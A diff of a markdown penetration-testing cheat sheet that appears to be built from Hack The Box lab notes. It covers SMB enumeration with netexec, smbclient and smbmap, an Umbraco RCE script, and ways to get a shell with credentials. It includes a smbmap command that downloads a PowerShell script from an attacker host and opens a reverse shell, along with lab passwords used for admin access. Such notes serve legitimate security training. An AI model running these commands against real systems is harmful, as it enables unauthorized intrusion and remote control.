@@ -4,14 +4,16 @@
 2.  [Samba](#Samba)
 	2.1  [Trying to List smb share using Guest account](#Trying%20to%20List%20smb%20share%20using%20Guest%20account)
 	2.2  [Dumbing Password Policy through SMB Share](#Dumbing%20Password%20Policy%20through%20SMB%20Share)
-	2.3  [Spidering SMB shares](#Spidering%20SMB%20shares)
-	2.4  [Listing the SMB Shares without password using smbclient](#Listing%20the%20SMB%20Shares%20without%20password%20using%20smbclient)
-	2.5  [Listing SMB Share using Password or NTLM hash](#Listing%20SMB%20Share%20using%20Password%20or%20NTLM%20hash)
-	2.6  [Connecting to specific SMB Share without username and password - Anonymously Accessing SMB Share](#Connecting%20to%20specific%20SMB%20Share%20without%20username%20and%20password%20-%20Anonymously%20Accessing%20SMB%20Share)
-	2.7  [Getting the file from SMB Share without password anonymously](#Getting%20the%20file%20from%20SMB%20Share%20without%20password%20anonymously)
-	2.8  [Execute Command using smbmap](#Execute%20Command%20using%20smbmap)
-	2.9  [smbmap - Non Recursive Path Listing](#smbmap%20-%20Non%20Recursive%20Path%20Listing)
-	2.10 [Get a Reverse shell using `smbmap`. Make sure python server and nc listener is running.](#Get%20a%20Reverse%20shell%20using%20`smbmap`.%20Make%20sure%20python%20server%20and%20nc%20listener%20is%20running.)
+	2.3  [Connecting to specific SMB Share without username and password - Anonymously Accessing SMB Share](#Connecting%20to%20specific%20SMB%20Share%20without%20username%20and%20password%20-%20Anonymously%20Accessing%20SMB%20Share)
+	2.4  [Connecting using `smbclient` with Credentials](#Connecting%20using%20`smbclient`%20with%20Credentials)
+	2.5  [Spidering SMB shares](#Spidering%20SMB%20shares)
+	2.6  [Listing the SMB Shares without password using smbclient](#Listing%20the%20SMB%20Shares%20without%20password%20using%20smbclient)
+	2.7  [Listing SMB Share using Password or NTLM hash](#Listing%20SMB%20Share%20using%20Password%20or%20NTLM%20hash)
+	2.8  [Connecting to specific SMB Share without username and password - Anonymously Accessing SMB Share](#Connecting%20to%20specific%20SMB%20Share%20without%20username%20and%20password%20-%20Anonymously%20Accessing%20SMB%20Share)
+	2.9  [Getting the file from SMB Share without password anonymously](#Getting%20the%20file%20from%20SMB%20Share%20without%20password%20anonymously)
+	2.10  [Execute Command using smbmap](#Execute%20Command%20using%20smbmap)
+	2.11  [smbmap - Non Recursive Path Listing](#smbmap%20-%20Non%20Recursive%20Path%20Listing)
+	2.12  [Get a Reverse shell using `smbmap`. Make sure python server and nc listener is running.](#Get%20a%20Reverse%20shell%20using%20`smbmap`.%20Make%20sure%20python%20server%20and%20nc%20listener%20is%20running.)
 3.  [Nmap](#Nmap)
 4.  [CURL](#CURL)
 5. [Ways to Get The Shell](#Ways%20to%20Get%20The%20Shell)
@@ -21,18 +23,13 @@
 ### Links
 
 [LZone Cheat Sheet](https://lzone.de/#/LZone%20Cheat%20Sheets)  - Someone Name Lzone prepare a nice checklist on Docker container, CI/CD and various other things. Good One to check out
-
 [CyberKhalid Cheat Sheet](https://cyberkhalid.github.io/categories/) - Just Another Checklist (FTP, AD, Kerberos, LDAP, Linux Persistence, Linux Privilege Escalation, SNMP, SSH, VNC, Windows Persistence, Telnet, etc.)
-
 [Windows Privilege Escalation](https://github.com/x0xr00t/PayloadsAllTheThings-1/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)  - PayloadAllTheThing GitHub Repo
-
 [Windows List of Privileges and Possible Ways to Exploit It](https://github.com/gtworek/Priv2Admin?tab=readme-ov-file)  - Scroll Down a bit to check the list.
-
 [Windows : Early Enumerations and Privilege Escalation](https://notes.shashwatshah.me/windows/local-privilege-escalation/privileges-information)  - Expand the list from the left menu
-
 [The Hacker Recipes](https://www.thehacker.recipes) - Its Just Like HackTricks
-
 [GitHub - OSCP CheatSheet ](https://github.com/0xsyr0/OSCP?tab=readme-ov-file#information-gathering) - One of the OSCP Cheat Sheet
+[SysInternals Tools EXEs](https://live.sysinternals.com/) - This link contains just Sysinternals Tools (System Internals) EXE file ready to use.
 
 ### Samba
 
@@ -47,34 +44,33 @@ netexec --verbose smb 10.10.10.111 -u Guest -p "" --shares
 netexec --verbose smb 10.10.10.111 -u Guest -p "" --pass-pol
 ```
 
-###### Spidering SMB shares
-
-```
-netexec --verbose smb 10.10.10.111 -u Guest -p "" --spider IPC$
-```
-
-###### Listing the SMB Shares without password using smbclient
-
-```
-$ smbclient --no-pass -L 10.10.10.134
-$ smbclient --no-pass -L //<IP> # Null user
-```
-
-###### Listing SMB Share using Password or NTLM hash
-```
-$ smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
-```
-
 ###### Connecting to specific SMB Share without username and password - Anonymously Accessing SMB Share
 ```
 # smbclient //10.10.11.174/support-tools            
 Password for [WORKGROUP\root]:
 Try "help" to get a list of possible commands.
 smb: \> dir
-
-  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:1
 ```
+###### Connecting using `smbclient` with Credentials
+```
+# smbclient -U 'fabricorp.local/tlavel%Fabricorp01' //10.10.10.193/C$
+session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
+```
+###### Spidering SMB shares
 
+```
+netexec --verbose smb 10.10.10.111 -u Guest -p "" --spider IPC$
+```
+###### Listing the SMB Shares without password using smbclient
+
+```
+$ smbclient --no-pass -L 10.10.10.134
+$ smbclient --no-pass -L //<IP> # Null user
+```
+###### Listing SMB Share using Password or NTLM hash
+```
+$ smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
+```
 ###### Getting the file from SMB Share without password anonymously 
 ```
 ──(root㉿kali)-[/home/ringbuffer/Downloads/Support.htb]
@@ -86,24 +82,19 @@ getting file \putty.exe of size 1273576 as putty.exe (1294.2 KiloBytes/sec) (ave
 └─# ls                                                        
 putty.exe
 ```
-
-###### Execute Command using smbmap
+###### Execute Command using `smbmap`
 ```
-# smbmap -u'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -d NEST.HTB -x 'net user' -H 10.10.10.178   
+# smbmap -u 'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -d NEST.HTB -x 'net user' -H 10.10.10.178   
 	# The `-d` switch can be ignored. 
 ```
-
 ###### smbmap - Non Recursive Path Listing
 ```
 # smbmap -u'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -r 'Users/C.Smith/HQK Reporting' -H 10.10.10.178
 ```
-
 ###### Get a Reverse shell using `smbmap`. Make sure python server and nc listener is running.
 ```
 # smbmap -u'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -x 'powershell iex (New-Object Net.WebClient).DownloadString("http://10.10.14.2/Invoke-PowerShellTcp.ps1");Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 4444' -H 10.10.10.178 
 ```
-
-
 ### Nmap
 
 Always run the nmap command in the following manner.
@@ -136,7 +127,6 @@ During the Remote.htb, I had the following scenario.
 $ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c whoami
 iis apppool\defaultapppool
 ```
-
 ###### Getting Shell When you have password
 
 Getting Shell from RCE was achieved as follows
@@ -156,7 +146,7 @@ $ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10
 
 During Privilege Escalation for the Remote.HTB, I got the Administrator Credentials but getting shell was something i spent my time on. So here are few ways to get a direct shell if you have a credentials.
 
-Using `impacket-wmiexec`
+`Using impacket-wmiexec`
 ```
 $ impacket-wmiexec 'Administrator:!R3m0te!@10.10.10.180'                      
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
@@ -168,21 +158,26 @@ C:\>whoami
 remote\administrator
 ```
 
-Using `smbclient`
+`Using smbclient`
 ```
 $ smbclient -U Administrator \\\\10.10.10.180\\C$
 Password for [WORKGROUP\Administrator]:!R3m0te!    # Provide the Admin Password Here
 ```
 
-Using Telnet
+`Using Telnet`
 ```
 $ telnet access.htb
 C:\Users\security>
 ```
 
-Using `smbmap` to run powershell command
+`Using smbmap to run powershell command`
 ```
-# smbmap -u'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -x 'powershell iex (New-Object Net.WebClient).DownloadString("http://10.10.14.2/Invoke-PowerShellTcp.ps1");Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 4444' -H 10.10.10.178
+# smbmap -u 'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -x 'powershell iex (New-Object Net.WebClient).DownloadString("http://10.10.14.2/Invoke-PowerShellTcp.ps1");Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 4444' -H 10.10.10.178
+```
+
+`using rpcclient`
+```
+# rpcclient -U 'bhult%Fabricorp012' 10.10.10.193
 ```
 ### PowerShell & Active Directory
 
